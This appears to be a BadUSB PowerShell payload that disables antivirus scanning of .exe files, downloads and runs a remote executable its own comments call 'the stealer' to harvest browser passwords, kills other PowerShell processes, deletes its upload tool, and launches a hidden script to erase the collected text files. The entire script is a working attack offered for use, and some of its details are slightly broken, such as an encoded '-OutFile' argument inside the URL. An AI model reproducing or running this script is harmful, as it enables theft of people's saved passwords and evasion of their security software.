#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        
Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://github.com/Mrdark2442/.sdas/blob/12f350d3672531e97d2eca371dfe4b59845cff52/TheMurk.exe?raw=true%20-OutFile%20TheMurk.exe #Download the stealer
.\TheMurk.exe #Create the file for Browser passwords
Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item telegram_uploader.exe
#Enable and disable capslock to know when you can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file
